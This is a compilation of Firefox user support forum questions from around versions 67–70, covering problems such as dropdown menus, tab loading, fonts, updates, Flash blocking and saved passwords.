Dropdown Menus Not Working Properly Firefox 67...,"This has been a continual problem since Firefox 56 or 57. There have been no suggestions that have worked to correct this issue. If someone wants to check this out for themselves, log into eBay and start the process to list an item. When you see all of the drop down menus to select different things (like the item condition, etc.), you will find that the menus will NOT stay open (you have to click and hold the left mouse button to make your selection). I noticed that the drop down menus on this site won't function correctly, either.This is occurring with two bluetooth mice and a USB mouse as well. The operating system is MacOS 10.14.3. The problem does not occur in the versions of Firefox prior to 56 or 57 and the problem does not occur in Chrome.One thing I just discovered is that if I click at the very outside edge of the menus, they will usually stay open. I really would like to get this issue solved once and for all. Refreshing the browser does not change anything and neither does safe mode. I think there is some coding change within Firefox that is causing the issue.If anyone has any idea as to what might be causing this issue, please respond. Thanks in advance. P.S. It was suggested that I try a test profile or a new load. I have just finished a completely fresh load of OS 10.14.3 on a brand new SSD. NONE of my Firefox profile information was transferred (only my bookmarks). I transferred NONE of my computer user profile information, either - I installed everything from scratch and manually transferred all of my documents, photos, music, movies, etc. The problem is STILL happening on a completely fresh build of my OS."

Firefox newer than v63 randomly prevents new tabs loading,"All was fine until I updated my firefox beyond v63. New tabs would randomly show dead blank pages and refuse to load anything. New tabs work about half the time, half the time unresponsive. Half the time opening firefox fresh wont respond unless I have done a system restart just before- then it always works every time. Its a real pain to copy the address from an unresponsive tab to paste into a working tab to view the page! When I reverted back to v63- everything worked fine again- except (of course) the Addon signing bug prevents my addons from working. I was happy to stay on v63 until the Addon signing bug happened- pages always loaded and addons had worked.So I have a dilemma- choose either: no addons working anymore in v63 but all tabs loading properly, or addons working normally in v67 but new tabs and the main program only working about half the time. Why cant I have both- working tabs and working addons.I have tried a firefox v67 reset to default, and then re-customised it & reloaded my addons but no fix. What is wrong? What has Mozilla done to cause the formerly working v63 to fail half the time somewhere between v63 and v67? How do I fix it?"

Firefox loses connection and cannot restart,"Generally after 2 to 5 hours of use, Firefox cannot connect to the internet anymore (and loses active connections such as from the Facebook Messenger page). When trying to close it, one process of firefox.exe will always stay active and also cannot be killed by the Windows Task Manager. Also restarting the program does not work, since it cannot start due to another instance already running. By then the only solution is rebooting the computer.This is going on now for about a week. I have had Firefox running on this laptop (Dell Precision M2800, Windows 7 Ultimate) as my major browser without major problems for years and have not recently installed any new software, but this is now becoming unworkable.The only things that have been the same for all times that it happened is that I had more than one window open with multiple tabs in at least one of the 2 windows and the www.facebook.com/messages page was open in the multiple tabs screen (since it is the tab that always stays open for me). Also the process of all the running firefox.exe instances that cannot be ended via any way, always uses around 300MB (±50MB) of memory.What I have tried so far:-Rolling back to version 66.0.4 (hoping it was a version related problem).-Full scan of my computer for viruses and malware.-Removing the original profile.-Uninstalling Firefox, including manually removing the Firefox related folders in AppData and Program Files and re-installing the latest version. Not installing any plug-ins or importing any of the previous settings or data.Edit: Running it in safe mode, gives the same result."

"I can access my Acct, but cannot create a new password","I've used Firefox since 2013. Love It. Went from full iOS and Mac to iOS and Droid, and full Droid with iOS and macOS.

How kick arse is that?)I can access and use Firefox via my mobile app w\out issue. A bookmarks, open pages, saved settings, Add Ons, Read Later, Downloads, etc. are accessible and I can share with my devices or other users. A few months ago, whist syncing my mobile (Samsung Galaxy Note), tablet (Galaxy S4) and iPhones, I decided to update my passcode. Because I work on Campaigns, I needed something Extremely Difficult, or Full Green, to ensure safety and work compliance. I had the perfect idea. It worked and my initial iPhone was now connected, as my tablet and Note were already Synced. Then, Shitestorm hit. As I went to confirm the password and save it, the device/WiFi/Site/I Don't Know: Refreshed!It saved only parts of the password and I tried to take screengrabs, but none were correct. Now, besides my Note, I cannot access Firefox on ANY device, Mobile nor Desktop. I've a lot of information and spent HOURS over the years perfecting my set-up! I don't have time anymore, literally.

"Can't play videos from vk in firefox, but can in chrome or Opera","Several weeks ago, I updated both Flash Player (version 32) and Firefox (67.0.4) on a Windows 7 machine. Ever since, I have been unable to view videos from vk.com. If I click on the video, it goes to the blank screen as though it is going to load, but the blank screen just sits there. There is no error message. Other sites, such as You Tube, seem to work fine. If I access vk.com from either Chrome or Opera, the videos load and play without a problem. On the Flash plugin, I have it set to ""ask to activate"". It does not ask the permission on vk.com. I have also tried to set the plugin to ""always activate"", but that does not work either. Since I can load and play the videos on the other browsers, I assume something with Firefox, either in my settings or in conjunction with Flash, is the issue. By the way, I did the upgrades because I got a message from vk when trying to play a video that my Flash was out of date."

I assume that I can delete this folder.The other two profile folders look pretty similar other than one of them is from about a year ago. Would the current folder (the one with today's date) have been created when some new version of FF was installed? I currently have 67.0.4.

How can i set the cursor to show up in the search bar on my homepage it constantly defaults to the address bar.,"Every time i click new tab the cursor focuses on the address bar not the search box on my about:home page.

It sucks to have to spend an hour or so re setting up your Firefox after an update where some dev figured since he liked the new setup everyone would so lets force everyone to use things the way we want them and screw anyone who has it set up the way they want it. As you can tell im rather upset about this would it be so hard to put an option in the menu to set focus on search bar not address bar so that the people who are used to it one way don't have to spend a chunk of their day trying to get their homepage and Firefox back to the way it was, Useful. Heck I would be happy if it was still Netscape navigator."

I don't know why more than 3 of the desktop icons keep coming up with the Firefox icon instead of the website's icon; i.e. Yahoo has a purple icon with a large letter Y. Firefox takes over and gives me a Firefox icon of a foxtail. This gets confusing when so many of my desktop icons look the same.

Is anyone else finding that new (as of couple days ago) Firefox isn't displaying embedded fonts correctly?,"I have an embedded font on my website that I use for the header, and it displays fine. I have a development copy of the website on my hard disk, and that displayed fine too until Firefox 68.0; but now it uses the second font in my list, instead of the first.So: some bug in the code of the copy on my disk, I thought.

Multiprocess can't be stopped via about:config. Why not?,"Latest version of FF 68.0 has re-enabled multiprocess and won't allow me to disable via about:config.

Since 10e and the whole multiprocess roll out, I've ""fixed"" peoples slow and unresponsive FF experience by disabling this useless feature and H/W acceleration.Now my mailbox is full of complaints about slow unresponsive browsing, plus it using more system resources leaving clients with less powerful machines with real problems.C'mon Moz, we've been mates for decades, stood by you when everyone was looking at whatever MS was waiving at them, laughed at Google when they tried to play with the big boy, but now I'm feeling sheepish about my claims of Mozilla putting its users needs first, not forcing features on users, giving its users a choice enabling a freedom that you don't have with Edge or ChromePlease give us back one of the remaining freedoms we have left, don't be MICROSOFT!"

Drop-down menus in 68.0 are double spaced.

"Why is Firefox rendering pages with the ""Last Resort"" font replacing some or all text? Chrome and Safari are not having this issue.","I recently had a font management program affect the fonts on my computer in an unexpected and unwanted manner. Immediately after this happened Firefox was no longer rendering type correctly on a number of webpages. Some were completely compromised with ""Last Resort"" (i.e., rounded boxes with question marks for each character) replacing all text, and some with only certain portions affected. At the time I did not check other browsers to see if/how they were affected.I replaced/reinstalled the Mac system fonts, and reinstalled around 90% of the additional fonts that I've collected over the years, however, Firefox was still having issues. At this point I uninstalled Firefox and pulled down a fresh copy, cleared all caches, and checked both Chrome and Safari. Firefox is still not working correctly and the other two browsers show no sign of the problem (if they ever had it all). Attached are screen shots of my My Yahoo! page in Chrome and Firefox showing the results of the issue.I would really love to keep using Firefox, but this problem would be a deal breaker.CheersRandy"

Problem with well-intended aspect of Monitor. I had a data breach despite excellent habits. I can't change every password!,"I am so sick of Google, I decided to give Firefox a try again. For the first time, it offered me Monitor, which demonstrated I have suffered a data breach, apparently at multiple sites, and they have all gotten hold of the same one of my passwords. Even though I suspect Y'all are aware that the breach was not my doing, Firefox is set up to treat me like an idiot after the fact, going into detail about safe passwords and using password manager apps--the whole thing about not using one password for multiple sites and all that, which I've been aware of and responded to cautiously and reliably for about the last fifteen years, of about twenty that I've been online.The problem is that I am very internet savvy, so that info, as helpful as it is meant to be, is useless to me and a bit offensive. I have been using LastPass for about the last five years. I have nearly 300 unique passwords. It is useless to me to be told that some strangers have access to one of my nearly 300 passwords. What am I supposed to do with that information, change all my passwords? Why did they not provide me the password that was part of the breach, so I can hunt it down and change it? Right now, all it's done is set me up to worry, when in fact, the forces that absconded with my data, presumably as part of huge data breaches involving major companies, probably have no interest in me whatsoever! I think presenting things in this manner, as well meant as it may have been, is a bit irresponsible and condescending. Not everyone out here is an idiot, even if we may not be computer techs. Is there any way I can learn which of my many passwords was part of this breach? What else am I supposed to do with this info, when I already have unique passwords for all of my many accounts and I use a password manager?I mean no offense in presenting my frustration and understand you all are volunteers and not responsible for the problems as I have outlined them. I hope someone can help me sort this out."

Firefox will randomly refuse to load any pages saying it can't find the page but after closing and reopening Firfox it will load the page just fine.,I have been having a weird problem for a while now where just about every day or so Firefox Developer Edition will act like it can't find a page I'm trying to load and acts as if the page doesn't exist when I know its available because I just accessed it that same day or a day ago. The weird thing is that when this happens if I close Firefox and restart it the page it said it couldn't find will load just fine. I am not sure whats causing this as its an odd thing to have happen and I am not seeing any pattern that I can pin down that would cause this as I don't change any settings when it happens I just restart the browser and it works fine. I on Windows 10 Pro desktop if that's of any help. When its refusing to load webpages saying it can't find them all other apps on my machine can access the net just fine so I 'm pretty sure its something with Firefox Dev just not sure what it is.

You can still see these slightly as part of the white border in the attached image.Here's a summary: Windows 10 Professional, latest updates installed (Version 1903) Clean Windows installation, barely any applications installed No Firefox add-ons installed Have tried reinstalling Firefox several times Firefox Safe Mode is even worse, it is unusable, drawing only tiny pieces of the window or nothing at all Disabling Hardware acceleration for Firefox has the same effect as Safe Mode Although I think a virus is highly unlikely, I've run a full scan anyway with nothing found No other applications have this issueMore info: Windows 10 Professional is running inside the latest version of Parallels Desktop Connected to a 4K 32"" monitor running at 100% scaling Changing scaling removes border but as soon as I resize once, white border reappears and I cannot resize Just tried disconnecting external display and running on laptop screen at various different resolutions, still no luckRunning inside a VM seems like the main point of difference - However I would have thought disabling hardware acceleration in Firefox would make that less relevant (instead, Firefox loses its mind with it off...).It sounds very similar to this issue https://support.mozilla.org/en-US/questions/1250398 which does not seem to have any resolution.

Firefox very very slow.Tried everything suggested. Malwarebites premium was the culprit. Solved,Posting this as it might help someone. I have used firefox for years and love the sync facility for passwords. Recently firefox became very slow and sometimes even froze. Went looking for a solution on the intenet and tried everything to no avail. Eventually uninstalled and removed every trace of firefox. Renistalled and everything was ok for a short while. Soon back being incredible slow. Chrome seemed to work much better and was acceptable. However while doing a test on intenet speed I got an error message from the site saying a firewall maybe preventing access. Made me think. No firewall problems on my router as my other computer with firefox on the same router was fine. Windows defender switched off. I then remebered I accidentally ended up with real time protection from malwarebites premium trial . I did not ask fot it. I switched real time protection malwarebites premium features off and rebooted computer . Everything fine since then. Firefox super fast and chrome a lot faster too. Hope this helps someone

hand icon does not display in google sheets,"A little hand used to show when I hovered the mouse over the edge of a cell (for dragging the cell).

The problem didn't start until March. The grab hand works with the older version. So boo hoo, one of the FF updates is responsible."

questions about: history and add a site to new tabs page,"i am trying to make room for a new site on the new tab page. i have supposedly cleared my history, but sites keep showing up and all the spaces in all four rows are taken up. i have clicked on ""remove from history"" for the sites that endlessly pop up. finally got a clear space--after manually deleting every site that came up--note--some would not delete. i find this curios.alas, the site i am trying to add via ""three dots: add site"" is not working.so, how do i actually delete more than 24 hours of browsing history? i can pull up the list of sites, but see no option to delete them.and, when you tell me how, is it possible to delete everything except what i have bookmarked/pinned to new tab?and why can i not add a site when there is now an empty space?really confused by this--but actually not as confused as to how long it took me to actually find how to ask a question. i am literally exhausted.thank you."

Restore (very) old non-saved Firefox session.,"A year ago Windows forced an update (that I'd been delaying a long time) while my computer was asleep.

Just had to accept it was gone to get done with my tasks the coming weeks. Sorry, long story. The problem: It happened again now, but I succesfully restored the session from sessionstore-backups with the .jsonlz4 file. Question is: I would like to restore last years session too. In the sessionstore-backups folder I can only find files from a month back. Is it ANY way to restore/find the URLs in the active tabs, from last year.

Getting 4-8x slower upload speeds when using firefox over other browsers,"I have gigabit internet. I routinely get speeds 4-8x slower when uploading through firefox than through chrome or ms edge.

I have done similar tests uploading the same file to youtube, vimeo and running the backblaze bandwidth test, as well as speedof.me. They all show firefox trailing behind by the same margins. Where I seem to see no difference however, is the Ookla speed test as in that case firefox tests about as high as chrome. I've tried reinstalling, safe mode and refresh. No extensions are on and I only run windows defender on Windows 10 (up to date updates). I spent the end of the afternoon calling my ISP thinking they were throttling traffic only to realize it's only firefox. Attaching a screen shot of Backblaze Bandwidth test and speedof.me that I happen to test in two different browsers when I first noticed the discrepancy. I seem to be pegged to the 65Megabit limit in my practical upload tests to youtube, google drive, and vimeo.

Hovering a tab over Bookmarks button no longer opens the dropdown?,"My browser updated to v69.0 this morning, and now I find myself unable to use functionality that I utilize quite often.

Now, however, hovering the tab over the Bookmarks button is no longer causing the dropdown to open.This becomes especially egregious if I want to save multiple tabs to the same folder simultaneously.

"When any audio is played while Firefox is open, my entire system's sound will begin to stutter","I'm on a Mac Pro using Sierra 10.12.6. Over the last few months, this problem has become more and more frequent. When playing an audio file (or video with audio), if Firefox is open, my entire system's sound will start ""stuttering,"" for lack of a better word. It does it so quickly that the audio sounds like a buzz. If I quit Firefox, everything returns to normal. I can even re-launch Firefox and play the same video or audio file, and it will work perfectly for a few hours, then it will happen again, and the only solution I can find is to quit Firefox and relaunch it (which is inconvenient if I happen to be also downloading or uploading at the time). BTW, the video continues to play normally--it's the audio that is screwed up--for any application that uses sound (iTunes, VLC, other browsers, etc).Anyone heard of this happening before? Any suggestions of how to eliminate the problem?"
How do I use a different password manager to sign in to Firefox,I have installed Last Pass password manager software which generates random passwords. I want to use this for my sign in for Firefox and cannot seem to do it. How can it be done?

"Firefox Requesting To Save Passwords I choose ""Never"" To Save","I've searched for answers but this seems to be a bit different than those who have asked relevant questions regarding the passwords being saved by those who have none saved at all. I do have sites with passwords saved in Firefox, but I get the annoying repeated prompt asking if I want to save passwords for sites I do not never want saved. These sites are almost all financial and when I logon to them as Firefox asks if I want to save the password/username, and I always choose ""Never"". Now I think when I choose ""never"" (for that particular site) that I will not get prompted again, but Firefox prompts the same request over and over again for the same sites I visit regularly. I recently switched back to Firefox after using Chrome for a few years as it was faster, but it has become slower loading web pages and is just too big. But I have never had a problem with Chrome asking again to save passwords once I chose ""Never"" to save. Firefox isn't keeping an internal never ask list on its own as I look at the exceptions and nothing is listed. If it's something I have to add manually, then why have Firefox give me the choice of ""Never"" to save passwords for ***** sites when I logon to them?Thanks!"

Cookies and site data exceptions,"Hello,I am having bit of a problem with the cookies in the latest Firefox 69 and the 69.0.1 update that I had just now.In the Firefox I had Cookies and site data permissions set to allow specific sites for the current session and now after the update looks like those cookies are getting blocked... I always have been using private mode and I had disabled all the cookies.Looks like a bug, right? I think I could try add exceptions to the Content blocking, but then again, other stuff apart from cookies will be allowed.Running browser in the safe mode gives same result.I would appreciate some help to resolve that issue.Thank you."

How do I make -no-deelevate the default for Firefox in Windows 7?,"I found the -no-deelevate option which let me repair the ""can't drag URL's to the desktop"" feature. I changed my usual shortcut to use it.How do I change Windows 7 to ALWAYS use that command line option when starting Firefox? For example, when I click on a link in an email, Windows starts the default web browser and passes it the link. How can I alter that command line to use -no-deelevate? There are also other programs that start a browser that need this tweak. I'm OK with editing the registry if needed, but I have no idea where to go to make this the default for any browser start in Windows? If this has to be program specific, then changing Thunderbird would be my email concern... but I'd really prefer a global solution."

"Alls Tabs go to ""wait"" spinner; must restart firefox","I have this issue on two different laptops. One is a brand new HP Envy. I don't know if the issue exists even with all plugins disabled, as sometimes it takes hours for this behavior to happen, and I need to have plugins enabled to do work. A couple times a day, all tabs within the browser show a spinner. The only (useful) way to fix it is to restart the browser. If I close the browser and wait, the window disappears, but I can still see (in the windows process manager) that there are two threads running. If I wait long enough (3-5 min), firefox will crash and send a report to mozilla. To get back up faster, I can kill the threads and restart firefox.But I can also pull tabs into a new window and they will display correctly. And then when I pull the tab back to the original window, it keeps displaying correctly for a while. You can see this in this video: https://drive.google.com/file/d/1VessuiTPlstsp3yH0h0QAG5o7Sc9gZ7E/view?usp=sharingYou can also see in the video, around 15 seconds, that LastPass plugin is slowing down firefox, which may offer some clues.

"Scrolling jumps instantly to bottom of screen, will not scroll up","Just the other day my scrolling was working fine and now I'm losing my mind. I went on a mission to see if I could stop Firefox from automatically opening a browser window on computer start-up, didn't change a single setting while I did this, and now suddenly my scrolling is effed up. I used to be able to cleanly and smoothly press the down key and flow all the way to the bottom, then press the up key and flow all the way back to the top. Now when I press the down key it either won't work or immediately jumps straight to the bottom, and when I press the up key it either doesn't work or it jumps straight back to the top and opens up random shortcut keys like Jump to Page.In Options-Browsing I have autoscrolling and smooth scrolling enabled.

Windows 10 sleep mode interrupts music playback with Mozilla Firefox,Hi community!I have set the energy setup of my Win 10 notebook to switch off the screen after 5 min inactivity and switch to sleep mode after 10 min.

Thank You for Making my Browser Unsecure!,"Not sure if this forum is monitored by anyone from the development team, just wanted to ""thank"" them for not giving me an option to completely disable the update prompts and forcing me to use the policies.json file...What you've managed to achieve with those annoying nags is instead of me updating the browser through Help->About every month or two when I get the need to restart it, is never updating it anymore until a site I need breaks... which probably won't happen anytime soon until StackOverflow decides to require a newer version than 69... It's way too much effort going to your site, downloading the full version and manually installing it every couple of months and then manually adding policies.json again when you've being accustomed to just going to Help->About for the same thing... so, thank you once again for managing to make my machine (and probably the ones of many other people too lazy to say anything) much more vulnerable!I've been wasting my time searching for workarounds ever since version 63 came out and setting ""app.update.doorhanger"" to false in about:config was an acceptable solution but you had to break that as well... I've been using Firefox ever since it came out all those years ago and will probably continue to use it but it will be only because I hate Chrome even more... guess I will be stuck with an old version from now on... hope you're happy with your ""great"" solution to keep people up-to date...It's fine that you want inexperienced users to be protected but why does it have to be at the expense of people who know what they're doing and want to decide for themselves when to update?What was so wrong with the ability to hide update nags from about:config where casual users never touch, that you had to remove it completely?"

Credit Union Australia now blocks my Firefox logins (Oct2019),"Credit Union Australia now blocks my Firefox logins (Oct2019) and they tell me to use Chrome (which works fine)! My system backups from earlier months also now fail (just to prove it's not MY end) so I am convinced the CUA have changed something, and particularly with their haste to denigrate Firefox products. (I hope I'm not the only cua user in trouble, else I'm going to look Really dumb!).

Firefox light theme conflicts with KDE Breeze Dark theme/ GTK light theme settings,"Using KDE Neon 5.17 with Firefox 69.02, if I use a dark theme with KDE (Breeze Dark), I can't override Firefox to fully be a light theme. This was working fine up until today, so something recent changed in an update.KDE is set to ""Breeze Dark"" as the theme. KDE's option for GKT2 and GTK3 theme ( settings -> gnome/gtk application style) are set to ""Breeze"" (light theme). Firefox's theme is set to ""light"" (it was working with ""default"" as well before). Almost all GUI elements are defaulting to dark. Menu items, tooltips, scrollbars, checkboxes etc. are dark. Browsing to bugzilla.mozilla.org (which seems to detect if you're in a dark theme/mode) will display in a dark css theme.I've set the following in about:config, but it doesn't seem to fix anything:ui.systemUsesDarkTheme;0 (fixes the CSS bugzilla issue but nothing else)widget.content.gtk-theme-override;Breeze (or Breeze:light)widget.content.allow-gtk-dark-theme;falseBasically, despite the fact that i've flipped every switch I can think of to tell firefox ""use a light color scheme"", it still wants to be in the system's overall dark theme. And again, this was working fine a day ago."

I migrated from w7 to W10 and on a new computer : The elevator under Firefox is very difficult to identify and click upon. W10 cannot be changed Chrome is OK,TThe problem is there is a very low contrast between the rectangular elevetor and the task bar. It is very difficult to see. And there is no way to change the color of the elevator (in vertical task bars) in w10. Chrome is OK. it is very clear with this browser. So I suppose Firefox could do an upgrade . I am not the only one annoyed with this problem. And I am sorry to say to you that until this problem is fixed I will read my mail with Chrome. And it's borung changing of browser when changing of application. Hop I have been clear enough . Cordialement from France Patrice Galacteros aka galacsi

Native windows u2f dialog blocking content,I recently started using security keys and when I go to a website requiring login I get some kind of windows native prompt to touch the key. However it blocks the content behind it making me unable to change some preferences before logging in (remember me for e.g.).Interestingly I've tried on a different machine at my workplace and instead of a windows native window I get a small integrated prompt which doesn't have this usability issue. Both of the machines use Firefox 70.0 and windows 10. My copy of windows is 1903 (I don't know about the other machine). Is there an option in firefox not to use native security prompts from windows?

I thought that maybe I had created an additional Firefox Sync account with the new email address and tried to log in with it, but that fails with ""Primary account email required for sign-in"".I am not aware of any other account and I checked my mailboxes (including the trash) to see if I have any registration or account change emails, but I cannot find anything. And given that fact, that I changed the email address before secondary emails were I think I also cannot see how it would even be possible.Is there anyway to find the primary email address (or the account) using only a secondary email address?If that is not possible, I'd like to have the secondary email address removed from whatever account it is attached to. I can proof I'm the only owner of that address. Would that be possible?"

Premature blocking of Adobe Flash Player continues in FF 70,"I am going to keep saying this until someone in the development area responds with a REASONABLE reply.Starting with FF 69, there is no way to allow Flash to run without being authorized for EVERY site, EVERY time one visits it. The developers have cited the fact that Flash itself will be discontinued by Adobe at the end of 2020 as justification for this. That is still over a year away and I see this move as very premature AND very user-UNfriendly.It has been less than a month since FF 69 and I am already tired of having to authorize the plugin every day on the three remaining sites (that I visit daily) which still require Flash because they have not upgraded to HTML5. While I understand completely that this is an industry-wide matter -- that Adobe itself will discontinue support for Flash -- Firefox's developers have made the (IMHO) absurd decision to inconvenience users more than a year before this move became necessary.What I would like to see is, when the pull-down menu from the ""Lego block"" displays, is an option under ""Allow"" to let the user designate ""Always allow for this site"". Once coded, it would never need to be removed, because as sites do convert to HTML5 there would no longer be a ""trigger"" for the Flash plugin.PLEASE, those of you developers who made the change in FF 69, do not perpetuate the image we all have of you as being heavy-handed and uncaring about Firefox users. Make our lives easier while we wait for our favorite sites to upgrade. Let us allow Flash to run, only on our specific sites, without a daily inconvenience.Admit you ""jumped the gun"" and do the right thing by us."
Firefox won't fully download xfinity e mail,"I have used Firefox for years. My email is provided by Comcast's Xfinity.

How do you change the search bar on the right back to the old look?,So Firefox updated again tonight and this time they did some changes to the little search bar on the right of the long one and I was wondering if there is a way I could change it back to the way it was before this new update.
After update to ESR68.2.0 Bookmark Descripions missing.,Win7 64bit. Firefox completed an upgrade to version 68.2.0 and when I clicked on Show all bookmarks the whole layout looks different and most important the description field is missing. This was a problem once before with a different version of Firefox but the ESR version was supposed to keep this. I know I can open the html file which shows this info but that is not nearly as easy to use or convenient as having that info a click away. Is there anyway to revert to a version or get this field to show again? thanks

"When running multiple profiles simultaneously, how to have Firefox updates in only one profile?","I'm a developer and always have multiple Firefox profiles running simultaneously from the same program/install directory. This generally works very well.The one issue I've struggled with is that since the removal of the ""never check for updates"" preference, the update behaviour of Firefox causes problems with multiple profiles. I have it set to prompt for updates, and I install them immediately from my ""main"" profile, but the ""newer release is available"" window keeps popping up in the other running profiles.This is mostly just annoying. However, if I accidentally accept the update in one of the other profiles, it then tries to update overtop of the already-updated Firefox and errors out. I've had to reinstall from a full download because of this several times, which is a bigger problem.I've looked for ways to disable the check-for-updates behaviour in my secondary profiles, but this doesn't seem possible. The only way to disable updates/checks for updates as I understand it is the enterprise policy method; however, this disables updates for all profiles using the same program/install directory. Obviously I like to keep up to date, so this is no good.I don't want to have to have a seprate program/install dir for each profile -- then I would just have to update them all separately anyway.Is there a way to have Firefox check for updates automatically, but only in my one main profile?Thanks,Charles"

How do I force Firefox to use my present location and not a cached location?,"I am a college student and I am required to use a website called Top Hat for one of my classes. With that website it requires access to my location in order to do secure attendance. Basically it asks for my location to check if you are in close proximity to other people in the class, i.e. if you are in lecture, and you didn't just get a friend to text you the code for attendance while you are at home. Here's the thing, for whatever reason in the version of firefox I am using firefox does not give top hat my current location, but rather gives my most recent location, which is usually from my home, off campus, thus marking me absent. This is what Top Hat support has told me, further on one occasion the location that was given was very far away while still in the state, which makes sense since I had just gotten back from a trip home that morning. So here is the question, how do I force firefox to check for my location when prompted to, rather than use my most recent location that is cached somewhere in the browser, and if possible, can I disable this cache so that firefox does not store my location for long periods of time. Also, would restarting firefox force firefox to check my location again?I am using firefox 68.0. I upgraded from firefox 57.0 over this past summer, and I did not have this issue with top hat and location services prior to upgrading."

If you used the old search bar very often like I did, the new one behaves totally differently and thus makes using it a total pain. I have no understanding for this kind of change, especially when I cannot change it back anymore.Can somebody please point me to a working solution of how to get the old search box back?

Firefox Constanly Crashing and Breaking Keyboard,"HiWell it's happening again. I believe that it was the last update before this one where I first encountered this problem and ended up having to completely reinstall Windows 10, which helped very little. Long story short, when that update took place my Toggle Keys were triggered and no matter what I do I can't turn them off. They're still like that. Today, Firefox crashed all of a sudden and then updated itself. Right before it crashed though, I was having trouble with my mouse and keyboard arrows (only happens when Firefox is open). The mouse buttons and the down key weren't working. I can get the mouse to work for maybe a minute if I hold down CTRL for a few seconds, but then it craps out on me again. Also, the down arrow wouldn't scroll down. The up arrow worked fine, but the down arrow wouldn't and I would have to press it repeatedly to scroll. And now it's doing what it was before I had no choice but to reinstall Windows. It's crashing nonstop. Sometimes it's just the tabs, sometimes it's the whole browser. I also just used Task Manager to end Firefox because I was on Unsplash and the page was flickering and showing weird patterns and I couldn't get out of it. But I got a low memory error, but my memory said it was only at 47%! All that was open was Firefox, Photoshop, and 3 folders. I've never had a low memory error!I've restarted in safe-mode, disabled add-ons, and done all the other usual steps. And of course I had to install Firefox again after I reinstalled Windows. I'm at a loss. This is so frustrating and pretty much makes going on the internet impossible. I really need and would ever so much appreciate any help.Thank you"

"After My Computer Crashed Due to a Selective Power Failure, My Firefox Tabs Refuse to Completely Load.","After my computer lost power due to a selective power failure (we are not currently sure whether it was a blown fuse or something else), we Rebooted the computer after connecting the power cable to an outlet that works. Currently power is still of at both the original outlet, and several other outlets in the area, as well as a selective area downstairs.Upon booting up Firefox (I have it set so that it will reopen any tabs I was viewing upon shutdown or restart or crash) I noticed that it was taking longer to load than usual (even accounting for the large number of tabs I constantly have open), and then after it had loaded that I could not access any of that tabs. I can click on them, and they will be highlighted if moused over, but the only thing that shows is a white screen for the actual site. I have included a picture of this. I have come to the conclusion that this is a Firefox error, given I was able to restart and recover all of my Google Chrome Tabs.In addition to the Tabs not loading, Tabs to the left and right of the Tabs currently viewable are not accessible, and seem to almost not exist, if not for the lack of scroll arrows. In addition, scrolling left and/or right produces no response.Normally I would grab the crash file and reopen the tabs from that, but I don't know whether I currently can, and current Firefox issues noted below make me leery of trying.Upon noting that I could, I attempted to open a second Firefox session, and succeeded. However, in this session some of the same issues are occurring, mainly that I cannot search anything through the html bar, including opening websites by name (i.e. google.com produces but a blank white screen and no reaction), and there is no new tabs screen when I open a new tab (as I have set up in my settings to be the case). However, I can, for some reason, access sites from my bookmarks. The only way I was able to send this report is that Firefox automatically opened to a homepage when I opened the new session.Needless to say, I'm rather concerned. I love Firefox as a browser, and not being able to use it is both concerning and frustrating. I hope to hear from you soon to resolve the matter.Many Thanks.P.S. If it at all helps (please disregard if it doesn't) the symbol that looks like a multi-forked branch on the modem is dark. I unfortunately do not know what that means."

Problems with new download of Firerfox new App,"I had been having problems with 69.03 version of Firefox and so downloaded the newest version. Then the hoop jumping starts. I was sent a code which even though it arrived immediately and I put it in within 30 seconds of asking for it, it was rejected. So we played that game for a while and eventually it went through. Then you have to sign up to numerous things that you do not want and provide a phone number. This is all rubbish. I could find no way of just having the Firefox browser and had to go back to my old version. Why on earth do companies feel that you want your world dominated by their products?

Tabs and some extensions blocked if resuming firefox after pc is suspended,"I often leave firefox on with some tabs open and put the pc on suspension mode.

Cleaning the browser cache never helps.If I restart firefox in temp mode (extensions disabled) all is good, but when I restart it in normal mode the issue is there again. I have to open/close it several times passing from temp to normal mode, somtimes I have to uninstall and reinstall LastPass as well. At last everything resolves. Any idea what could be causing this? A particular extension? I don't have many installed (I attach a screenshot of my current ones).Thank you"

Just got the latest FF update and Adaware Secure Search showed up in my addons. There's no option to remove it.,"Windows 10 Pro, Version 1903, OS Build 18362.418FF 70.0 (64 bit)Let me preface this with saying I worked in IT for a long time. I'm stumped on this one.FF worked fine on 10/22/19. Tried opening FF on 10/23/19 and it kept crashing. I started the task of finding out why. Opened in Safe Mode and saw the latest FF update. Also discovered a new addon that I did not install: Adaware Secure Search. It wasn't there the last time I reviewed addons (which I do frequently, trying to find the best addon's for my usage) and I hadn't installed anything new recently. Disabled Adaware and FF started opening properly.I don't want Adaware Secure Search however there is no Remove option in the dropdown. So, I started hunting online to try and remove it. It is not in the Control Panel. It is not in the registry - I searched in every folder. Ran MalwareBytes and other tools - they don't see Adaware Secure Search anywhere.I followed the instructions that required the use of Troubleshooting and found Adaware is also not in my FF profile (that I can tell - the .xpi files are difficult to figure out since the majority are in number value). Tried refreshing FF and it showed up again. Un/re-installed FF and there it is again!...but this time i had the ""joy"" of having to redo my tabs, etc. It isn't on my other browsers either, just FF.How do I get this removed? I don't want it to somehow become enabled in my system."

Gmail problem after update to Catalina,"In the Gmail client, I often go to the drop down menu (3 vertical dots) and choose ""Filter messages like these"" to sort future emails into one of the many ""labels"" I use.

I then opened Google Chrome (see attached image), went to the same email in my Gmail client, and the feature worked. I suspect that the issue with using the feature in Firefox is that I upgraded to macOS 10.15 Catalina last night. I am using Firefox 70.0 for my browser as I prefer many of its features over what I have in Chrome or Safari. Please let me know if you are aware of this issue, or whether I am an outlier, having a one-off problem."
Saved passwords being replaced by Firefox-randomly-generated ones?,"Hi, I'm using Firefox 70 but also seeing this in Firefox 68.2 esr. We're seeing an issue where, when staff go to login to a particular website, their saved password is being autofilled with a randomly generated one. I had the staff go in to Firefox password management and delete the incorrect saved passwords. I had the staff member log back in to the site and enter their correct password to the website. They could log in, and Firefox would prompt the user if they wanted to save the password. But once again, the password that Firefox was prompting to save was a randomly-generated one and NOT the one the user just entered. Has anyone else seen this? The user was previously on a much older build of Firefox (somewhere in the 40s? not sure why it's not auto-updating either? Firefox had to update itself twice to get to the most current version.)

Questions about Content blocking in Firefox 70.,"There is a strange thing with Firefox Content blocking after Firefox 70 update - when I visit some site Firefox reports that it has tracking cookies but this cookies located in the list of blocked and allowed at the same time, also I saw purple shield in adress bar, so Firefox block something on this time.

